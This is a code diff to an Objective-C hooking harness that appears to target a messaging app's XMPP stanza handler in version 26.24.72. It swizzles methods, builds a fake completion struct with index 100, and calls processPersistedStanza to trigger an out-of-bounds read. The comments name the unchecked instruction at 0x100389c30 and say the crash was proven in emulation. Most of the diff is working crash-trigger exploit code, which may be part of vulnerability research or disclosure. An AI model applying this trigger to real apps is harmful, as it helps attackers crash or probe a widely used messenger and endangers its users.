@@ -91,6 +91,11 @@ static void wa_swizzle(Class cls, SEL sel, IMP newImp, void **origOut) {
 //   Lead 1: OLD has cmp #9 guard -> expect GUARD-CAUGHT (control).
 //   Lead 2: OLD UNGUARDED second-call result -> weak path (signal).
 //   Lead 3: OLD cmp #3 jump table -> expect guarded (control).
+//
+// ME72n (NEW 26.24.72 target): NEW lead1 @ 0x100389c30 has NO bounds check
+// (ldrsw x8,[x20] -> ldr x0,[x24,x8]) — emulation proved idx=100 crashes
+// (READ_UNMAPPED OOB read). Drive passes explicit int32=100 completion
+// struct to trip it. Lead2/lead3 on NEW: guarded/safe (control).
 // ---------------------------------------------------------------------------
 
 // ME72m: crafted instances are calloc + manual isa. class_createInstance is
@@ -151,14 +156,25 @@ static void run_drive_inline(void) {
     }
 
     // Lead 1 — crafted nseMergeCompletion whose first int32 is huge.
+    // NEW 26.24.72 @ 0x100389c30: ldrsw x8,[x20]; ldr x0,[x24,x8] — NO bounds
+    // check. idx=100 -> READ_UNMAPPED crash (emulation-proven). Pass an
+    // explicit struct: first int32 = 100, rest zeroed (calloc, no +1).
     if (orig_processPersistedStanza) {
-        wa_marker(@"[drive] lead1: calling orig with crafted mergeCompletion...");
+        wa_marker(@"[drive] lead1: calling orig with crafted mergeCompletion (idx=100)...");
         Class c = NSClassFromString(@"XMPPConnectionMain");
         __unsafe_unretained id self1 = craftedInstanceOfClass(c);
-        orig_processPersistedStanza(self1,
-            NSSelectorFromString(@"processPersistedStanza:inPersistentStanzaQueue:isFromDeferredNSEMerge:nseMergeCompletion:"),
-            nil, nil, NO, g_emptyComp);
-        wa_marker(@"[drive] lead1: RETURNED (guard caught / safe path)");
+        void *completionMem = calloc(1, 32);
+        if (completionMem) {
+            int32_t idx = 100;                 // emulation-proven OOB index
+            memcpy(completionMem, &idx, 4);    // int32 at struct+0
+            __unsafe_unretained id craftedCompletion = (__bridge id)completionMem;
+            orig_processPersistedStanza(self1,
+                NSSelectorFromString(@"processPersistedStanza:inPersistentStanzaQueue:isFromDeferredNSEMerge:nseMergeCompletion:"),
+                nil, nil, NO, craftedCompletion);
+            wa_marker(@"[drive] lead1: RETURNED (no crash — guard/table caught it)");
+        } else {
+            wa_marker(@"[drive] lead1: SKIP (calloc failed)");
+        }
     } else {
         wa_marker(@"[drive] lead1: SKIP (orig not hooked)");
     }
